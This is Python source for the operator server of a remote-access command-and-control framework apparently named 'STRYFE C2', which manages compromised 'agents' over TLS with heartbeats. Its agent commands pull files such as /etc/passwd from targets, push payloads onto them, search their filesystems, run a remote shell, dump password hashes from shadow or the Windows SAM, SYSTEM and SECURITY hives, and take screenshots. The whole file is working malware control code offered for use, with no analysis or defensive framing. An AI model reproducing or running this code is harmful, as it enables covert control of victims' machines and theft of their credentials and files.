import socket, threading, ssl
import secrets, os, platform, json
from agent import Agent
from symbols import *
import select, datetime
from prompt_toolkit import PromptSession
import time

DATA_CHUNK_SIZE = 1024
COMMAND_CHUNK_SIZE = 4096
BEAT_CHUNK_SIZE = 4
INCOMING_FOLDER_NAME = "incoming"
HEARTBEAT_TIMEOUT = 3


class Server:

    ####################################################################################################################
    ################################################# CONSTRUCTOR ######################################################
    ####################################################################################################################
                                                                      
    def __init__(self, address, port, beat, debug):
        self.address = address
        self.port = port
        self.beat_port = beat
        self.agents = []
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.beat_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
        self.current_id = 1
        self.platform = platform.system()  # Initialize the C2 platform
        self.stop_event = threading.Event()  # Test to stop threads
        self.current_agent = Agent(['', ''], '', 0, 0)  # Dummy agent for initialisation
        self.is_exited = False
        self.debug = debug
        self.banner = """
        ███████╗████████╗██████╗ ██╗   ██╗███████╗███████╗     ██████╗██████╗ 
        ██╔════╝╚══██╔══╝██╔══██╗╚██╗ ██╔╝██╔════╝██╔════╝    ██╔════╝╚════██╗
        ███████╗   ██║   ██████╔╝ ╚████╔╝ █████╗  █████╗      ██║      █████╔╝
        ╚════██║   ██║   ██╔══██╗  ╚██╔╝  ██╔══╝  ██╔══╝      ██║     ██╔═══╝ 
        ███████║   ██║   ██║  ██║   ██║   ██║     ███████╗    ╚██████╗███████╗
        ╚══════╝   ╚═╝   ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝     ╚═════╝╚══════╝
"""

        self.commands = {
            'agents': {
                'function': self.display_agents,
                'description': 'List all connected agents'
            },
            'agent': {
                'function': self.select_agent,
                'description': 'Select an agent by ID | ID: Integer | Ex: agent 3'
            },
            'bg': {
                'function': self.background,
                'description': 'Deselect the current agent'
            },
            'kill': {
                'function': self.kill_agent,
                'description': 'Kill an agent by id | ID: Integer | kill 4'
            },
            'exec': {
                'function': self.exec,
                'description': 'Execute a system command in the local machine'
            },
            'help': {
                'function': self.help,
                'description': 'Show this help message'
            },
            'exit': {
                'function': self.exit,
                'description': 'Exit the server'
            }
        }

        self.agent_commands = {
            'download': {
                'function': self.download,
                'description': 'Download the specified files | FILE: String | Ex: download /etc/passwd /etc/hosts'
            },
            'upload': {
                'function': self.upload,
                'description': 'Upload a file to selected target | LOCAL_FILE: String   REMOTE_DEST: String | upload payload.exe /tmp/payload.exe'
            },
            'search': {
                'function': self.search,
                'description': 'Search a file on the target\'s filesystem '
            },
            'shell': {
                'function': self.shell,
                'description': 'Open a reverse shell from the selected agent (type exit to quit the shell) (not interactive)'
            },
            'hashdump': {
                'function': self.hashdump,
                'description': 'Dump the hashes from the target (may crash on Windows)'
            },
            'ipconfig': {
                'function': self.ipconfig,
                'description': 'Retrieve the IP Configuration from the current target '
            },
            'screenshot': {
                'function': self.screenshot,
                'description': 'Take a screenshot from the selected agent, you can optionally specify a name for the screenshot | Optional: FILE: String | screenshot [my_screenshot]'
            }
        }

    def __str__(self):
        return f"Server: {len(self.agents)} agents connected"

    ####################################################################################################################
    ########################################### SERVER MANAGEMENT ######################################################
    ####################################################################################################################

    def start(self):
        self.debug_print("START", True)
        """Start the server, socket initialization, binding, listening and creation of SSL context for encryption"""
        self.server_socket.bind((self.address, self.port))
        self.server_socket.listen(5)
        self.debug_print(f"Listening on port {self.port}")

        self.beat_socket.bind((self.address, self.beat_port))
        self.beat_socket.listen(5)
        self.debug_print(f"Listening on port {self.beat_port}")
        try:
            self.context.load_cert_chain(certfile="server.crt", keyfile="server.key")
            self.debug_print("Certificate imported")
        except FileNotFoundError:
            print("Error: Certificate and key files not found. Please generate them and place them in the same directory as the server.py file.")
            self.exit()

        print(self.banner)
        threading.Thread(target=self.accept_connections).start()
        self.debug_print("Accept connection thread started")
        threading.Thread(target=self.accept_beat).start()
        self.debug_print("Accept beat thread started")
        threading.Thread(target=self.check_agents).start()
        self.debug_print("Check agents thread started")

    def main_loop(self):
        self.debug_print("MAIN LOOP", True)
        session = PromptSession()
        while True:
            active_agent = f"[{len(self.agents)} active]" if self.current_agent.id == 0 else f"[Agent {self.current_agent.id}]"
            try:
                command = session.prompt(f"{active_agent}> ").strip()

                if command:
                    command_name, *args = command.split(' ')
                    command_name = command_name.lower()
                    if command_name in self.commands:
                        self.commands[command_name]['function'](' '.join(args))
                    elif command_name in self.agent_commands:
                        if self.is_agent_selected():
                            self.agent_commands[command_name]['function'](' '.join(args))
                    else:
                        print(f"Unknown command: {command_name}")
            except KeyboardInterrupt:
                self.exit()

    ####################################################################################################################
    ########################################### CONNECTION HANDLING ####################################################
    ####################################################################################################################

    def agent_deserialization(self, client_socket):
        # Get the json host information
        json_string = client_socket.recv(DATA_CHUNK_SIZE).decode()
        self.debug_print("Get the client information")
        if not json_string:
            self.debug_print("No client information")
            return
        json_object = json.loads(json_string)
        self.debug_print("Information loaded as json object")

        agent = self.new_agent(client_socket.getpeername(), client_socket)
        self.debug_print("Agent object created")
        agent.hostname = json_object['hostname']
        agent.user = json_object['user']
        agent.mac = json_object['mac']
        agent.uid = json_object['uid']
        agent.os = json_object['os']
        agent.listening_beat_port = int(json_object['beat'])

        return agent

    def send_beat_id(self, agent):
        # self.debug_print("SEND BEAT ID", True)

        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE

        client_beat_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # self.debug_print(f"Try to connect to {agent.ip}:{agent.listening_beat_port}")
        client_beat_socket.connect((agent.ip, agent.listening_beat_port))
        # self.debug_print("Beat socket connected")
        id_to_send = agent.id.to_bytes(4, byteorder='big')
        # self.debug_print(f"ID to send :: {id_to_send}")
        client_beat_socket.sendall(id_to_send)
        # self.debug_print("Beat ID sent")

    def handle_client(self, client_socket):
        self.debug_print("HANDLE CLIENT", True)
        """
        Receive basic information about the target:
        - MAC address in integer
        - User running the agent
        - UID of the agent (see getClientUID method in client)
        @param client_socket: the socket of the client
        """
        agent = self.agent_deserialization(client_socket)
        self.send_beat_id(agent)

    def accept_connections(self):
        """Loop accepting incoming connections"""
        self.debug_print("THREAD ACCEPT CONNECTIONS", True)
        while not self.stop_event.is_set():
            client_socket, client_address = self.server_socket.accept()
            self.debug_print(f"Got client connection from {client_address}")
            if self.is_exited:
                self.debug_print("THREAD accept connections exiting")
                return
            try:
                client_socket = self.context.wrap_socket(client_socket, server_side=True)
                self.debug_print("Socket wrapped")
                self.handle_client(client_socket)
                self.debug_print("Client handled")

            except ssl.SSLError as e:
                print(f"SSL error: {e}")
            except OSError:
                pass

    def close_all_connections(self):
        self.debug_print("CLOSE ALL CONNECTIONS", True)
        for agent in self.agents:
            agent.sock.close()
        self.debug_print("ALL CONNECTIONS CLOSED")

    ####################################################################################################################
    ############################################## HEARTBEAT ###########################################################
    ####################################################################################################################
    def accept_beat(self):
        """Accept incoming heartbeats"""
        self.debug_print("THREAD ACCEPT BEAT", True)
        while not self.stop_event.is_set():
            # self.debug_print("Waiting for beat")
            client_socket, client_address = self.beat_socket.accept()
            # self.debug_print(f"Got beat connection from {client_address}")
            if self.is_exited:
                # self.debug_print("THREAD accept beat exiting")
                return
            try:
                client_socket = self.context.wrap_socket(client_socket, server_side=True)
                # self.debug_print("Socket wrapped")
                threading.Thread(target=self.handle_beat, args=[client_socket]).start()
                # self.debug_print("Beat update handled")
            except ssl.SSLError as e:
                print(f"SSL error: {e}")
            except OSError as e:
                print(f"OSError : {e}")
                pass

    def handle_beat(self, client_socket):
        """
        Handle the heartbeat of the agent
        @param client_socket: the socket of the agent
        """
        self.debug_print("HANDLE BEAT", True)
        incoming_id = client_socket.recv(BEAT_CHUNK_SIZE)
        self.debug_print(f"Got {len(incoming_id)} bytes")
        agent_id = int.from_bytes(incoming_id, byteorder='big')
        self.debug_print(f"Got beat from agent {agent_id}")
        for agent in self.agents:
            if agent.id == agent_id:
                agent.last_beat = time.time()
                self.debug_print(f"Agent {agent_id} updated")
                break

    def check_agents(self):
        """Check if the agents are still alive by checking the last beat"""
        self.debug_print("CHECK AGENTS", True)
        while not self.stop_event.is_set():
            if self.is_exited:
                self.debug_print("THREAD check agents exiting")
                return
            for agent in self.agents:
                if time.time() - agent.last_beat > HEARTBEAT_TIMEOUT:
                    print(f"\nAgent {agent.id} died ({agent.ip})")
                    self.delete_agent_by_id(agent.id)
            self.stop_event.wait(2)
    ####################################################################################################################
    ############################################## USUAL METHODS #######################################################
    ####################################################################################################################
    def simple_ssl_connection(self, port):
        """ Perform a simple SSL connection to the listening socket. Must be used to exit the server """
        # open connection socket to the listening socket. SSL connection
        try:
            self.debug_print("Sending a simple ssl connection")
            context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE

            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            secure_sock = context.wrap_socket(sock, server_hostname=self.address)

            secure_sock.connect((self.address, port))
            self.debug_print("Simple connection sent")
        except Exception as e:
            pass

    def help(self, args=None):
        """Print help for commands"""
        print("\nAvailable Commands:")
        print("=" * 20)
        for cmd, info in self.commands.items():
            print(f"{cmd:<12}: {info['description']}")
        print("=" * 20 + " ONCE AGENT SELECTED:")
        for cmd, info in self.agent_commands.items():
            print(f"{cmd:<12}: {info['description']}")
        print("=" * 20)
        print("Usage:")
        print("  command [args]\n")

    def send_file(self, file_path):
        """
        generic function to send a file to the agent.
        @param file_path: the path of the file to send
        """
        self.debug_print("SEND FILE", True)
        try:
            with open(file_path, 'rb') as f:
                while chunk := f.read(COMMAND_CHUNK_SIZE):
                    self.current_agent.sock.sendall(chunk)
                    self.debug_print(f"Sending {len(chunk)} bytes")
            self.current_agent.sock.sendall(SIG_EOF)
            self.debug_print("End of file")
            print(f'File sent: {file_path} ({os.path.getsize(file_path)} b)')
        except Exception:
            print("File not found")
            self.current_agent.sock.sendall(FILE_NOT_FOUND)

    def get_file(self, file_path):
        """
        generic function to get a file from the agent.
        @param file_name: the path of the file to get
        """
        self.debug_print("GET FILE", True)
        file_length = 0
        try:
            with open(file_path, 'w+b') as f:
                while True:
                    data = self.current_agent.sock.recv(COMMAND_CHUNK_SIZE)
                    if data == SIG_EOF or not data:
                        break
                    if data == FILE_NOT_FOUND:
                        print(f"ERROR: The file is not found on the target.")
                        os.remove(file_path)
                        return
                    elif data == ERROR_INSUFFICIENT_PERMS:
                        print(f"ERROR: Insufficient permissions to get {file_path}.")
                        os.remove(file_path)
                        return
                    elif data == OTHER_ERROR:
                        print(f"ERROR: An error occurred on the target while getting the file.")
                        os.remove(file_path)
                        return
                    f.write(data)
                    file_length += len(data)
            print(f'File saved at {file_path} ({file_length} b)')
        except Exception as e:
            print(f"Error: {e}")
            os.remove(file_path)

    def get_file_without_path(self, remote_file_path):
        self.debug_print("GET FILE WITHOUT PATH", True)
        self.download_folder_creation()
        file_name = os.path.basename(remote_file_path)
        full_path = os.path.join(self.get_download_folder_path(), file_name)
        self.debug_print(f"Full path : {full_path}")
        self.get_file(full_path)
        self.debug_print(f"Got file at {full_path}")

    def get_download_folder_path(self):
        """Get the path of the folder where the downloaded files will be stored"""
        folder_name = f"{self.current_agent.ip} - {self.current_agent.user}@{self.current_agent.hostname}"
        return os.path.join(os.getcwd(), INCOMING_FOLDER_NAME, folder_name)

    def download_folder_creation(self):
        """Create a folder to store the downloaded files if it doesn't exist"""
        full_local_path = self.get_download_folder_path()
        os.makedirs(full_local_path, exist_ok=True)

    def debug_print(self, message, is_function=False):
        if self.debug:
            if is_function:
                message = f"[+] {message}"
            print(message)

    ####################################################################################################################
    ########################################### AGENT MANAGEMENT #######################################################
    ####################################################################################################################

    def new_agent(self, client_address, client_socket):
        self.debug_print("NEW AGENT", True)
        agent_id = self.current_id
        agent = Agent(client_address, client_socket, agent_id, time.time())
        self.debug_print("Agent object created")
        self.current_id += 1
        print(f"\n[!] New connection:\n{agent}")
        self.add_agent(agent)
        self.debug_print(f"Agent added :: {len(self.agents)} agents in the list")
        return agent

    def add_agent(self, agent_to_add: 'Agent'):
        """Add an agent to the C2 list"""
        self.agents.append(agent_to_add)

    def delete_agent_by_id(self, id):
        try:
            id = int(id)
            found_flag = False
            for index, agent in enumerate(self.agents):
                if agent.id == id:
                    found_flag = True
                    agent.sock.close()
                    self.agents.pop(index)
                    self.debug_print(f"Agent deleted :: {len(self.agents)} agents in the list")
                    break
                if not found_flag:
                    print(f"No agent with ID {id}")
            if self.current_agent.id == id:
                self.current_agent = Agent(['',''],'',0, 0)  # Reset with a dummy agent
        except ValueError:
            print("Agent ID needs to be an Integer")
        except OSError:
            pass

    def kill_agent(self, id):
        self.debug_print("KILL AGENT", True)
        agent_to_kill = self.get_agent_by_id(id)
        if agent_to_kill is not None:
            agent_to_kill.sock.sendall("kill".encode())
            self.debug_print(f"Kill command sent to {agent_to_kill.ip}")
            self.delete_agent_by_id(id)

    def get_agent_by_id(self, id):
        """ Get the agent object by ID """
        for agent in self.agents:
            if agent.id == id:
                return agent
        return None

    def select_agent(self, args):
        self.debug_print("SELECT AGENT", True)
        try:
            id = int(args)
        except ValueError:
            print("Agent ID needs to be an Integer")
            return
        agent = self.get_agent_by_id(id)
        if agent is not None:
            self.current_agent = agent
        else:
            print(f"No agent with ID {id}")

    def display_agents(self, args=None):
        """Display all connected agents"""
        if self.agents:
            banner_size = 90
            print("")
            print("=" * banner_size)
            print(f"{'ID':<5}{'Connection':<23}{'Session':<30}{'Uptime':<15}{'OS'}")
            print("-" * banner_size)
            for agent in self.agents:
                print(f"{agent.id:<5}{agent.ip + ':' + str(agent.port):<23}{agent.user + '@' + agent.hostname:<30}{str(self.get_agent_uptime(agent)):<15}{agent.os}")
            print("=" * banner_size)
            print("")
        else:
            print("No agents connected")

    def is_agent_selected(self):
        if self.current_agent.id != 0:
            return True
        else:
            print("Please select an agent")

    def get_agent_uptime(self, agent):
        timestamp = datetime.datetime.now()
        difference = timestamp - datetime.datetime.fromisoformat(agent.timestamp)
        days = difference.days

        # Retrieving days, hours, minutes and seconds from the difference
        hours, remainder = divmod(difference.seconds, 3600)
        minutes, seconds = divmod(remainder, 60)

        # Add days hours minute to the list only if they are greater than zero to skip useless data
        result = [f"{value}{name}" for value, name in [(days, "d"), (hours, "h"), (minutes, "m"), (seconds, "s")] if
                  value > 0]

        # join the list to a string
        return ' '.join(result)

    ####################################################################################################################
    ########################################### SERVER COMMANDS ########################################################
    ####################################################################################################################

    def background(self, args=None):
        """ Unselect the current agent """
        self.current_agent = Agent(['', ''], '', 0)

    def exec(self, args):
        """ Execute a system command in the local machine """
        os.system(args)

    def exit(self, args=None):
        self.debug_print("EXIT", True)
        self.is_exited = True
        print("\nClosing server...")
        # unblock the listener
        self.simple_ssl_connection(self.port)
        self.debug_print("Listening socket unblocked")

        self.server_socket.close()
        self.debug_print("Listening socket closed")

        self.simple_ssl_connection(self.beat_port)
        self.debug_print("Beat socket unblocked")

        self.beat_socket.close()
        self.debug_print("Beat socket closed")

        self.stop_event.set()
        self.debug_print("Event Stopped")

        self.close_all_connections()
        self.debug_print("All connections closed")

        exit(0)

    ####################################################################################################################
    ########################################### CLIENT COMMANDS ########################################################
    ####################################################################################################################

    def download(self, args):
        self.debug_print("DOWNLOAD", True)
        args = list(filter(lambda x: x != "", args.split(" ")))
        if len(args) < 1:
            print("Please select at least one remote file to download\n\tEx: download /etc/passwd")
            return
        self.current_agent.sock.sendall(f"upload {args}".encode())
        self.debug_print("Ask for the agent to upload")
        for file_path in args:
            self.get_file_without_path(file_path)

    def upload(self, args):
        self.debug_print("UPLOAD", True)
        args = list(filter(lambda x: x != "", args.split(" ")))
        if len(args) < 2:
            print("Please select a local file path and a remote path\n\tEx: upload payload.exe C:\\Users\\john\\Desktop\\payload.exe")
            return
        self.current_agent.sock.sendall(f"download {args[1]}".encode())
        self.debug_print("Ask for the agent to download")
        self.send_file(args[0])

    def shell(self, args=None):
        """ Enter in shell mode. The commands are sent to the agent and the output is displayed """
        self.debug_print("SHELL", True)
        self.current_agent.sock.sendall("shell".encode())
        session = PromptSession()
        while True:
            command = session.prompt('$> ').strip()
            if command == '':
                continue
            if command.lower() == 'exit':
                self.debug_print("Tell the agent to exit this mode")
                self.current_agent.sock.sendall("exit".encode())
                self.debug_print("Exiting the shell mode")
                break
            self.current_agent.sock.sendall(command.encode())
            self.debug_print("Command sent")
            print(self.current_agent.sock.recv(8192).decode('latin1'))
            self.debug_print("Got the return of the command")

    def search(self,args):
        self.debug_print("SEARCH", True)
        args = list(filter(lambda x: x != "", args.split(" ")))
        if len(args) < 2:
            print("Please specify a starting path and a file name\n\tEx: search C:\\ Unattend.xml")
            return
        self.current_agent.sock.sendall(f"search {args[0]} {args[1]}".encode())
        self.debug_print("Search command sent")
        while True:
            data = self.current_agent.sock.recv(DATA_CHUNK_SIZE)
            self.debug_print(f"Got {len(data)} bytes")
            decoded_data = data.decode("latin1")
            if (data == SIG_EOF) or (not data):
                self.debug_print("End of file")
                break
            print('---')
            print(decoded_data)

    def hashdump(self, args=None):
        self.debug_print("HASHDUMP", True)
        files = []
        # file names
        shadow_filename = "shadow"
        sam_filename = "sam"
        system_filename = "system"
        security_filename = "security"
        # set files to extract based on the OS
        if self.current_agent.os == "Linux":
            self.debug_print("Linux hashdump")
            files.append(shadow_filename)
        elif self.current_agent.os == "Windows":
            self.debug_print("Windows hashdump")
            files.append(sam_filename)
            files.append(system_filename)
            files.append(security_filename)
        else:
            print("OS not supported")
            return

        self.debug_print("Files to retrieve:")
        for file in files:
            self.debug_print(f"{file}")
        # send the command to the agent
        self.current_agent.sock.sendall("hashdump".encode())
        self.debug_print("hashdump command sent")
        for i in range(len(files)):
            self.get_file_without_path(files[i])

    def ipconfig(self, args=None):
        self.debug_print("IPCONFIG", True)
        self.current_agent.sock.sendall("ipconfig".encode())
        self.debug_print("ipconfig command sent")
        data = self.current_agent.sock.recv(16384)
        self.debug_print("Got the ipconfig")
        print("\n" + data.decode('utf-8'))

    def screenshot(self, args):
        self.debug_print("SCREENSHOT", True)
        self.current_agent.sock.sendall("screenshot".encode())
        args = list(filter(lambda x: x != "", args.split(" ")))
        if len(args) >= 1:
            screen_path = f"{args[0]}.jpg"
        else:
            screen_path = f"{secrets.token_hex(5)}.jpg"
        self.get_file_without_path(screen_path)
        self.debug_print("Got the screenshot")
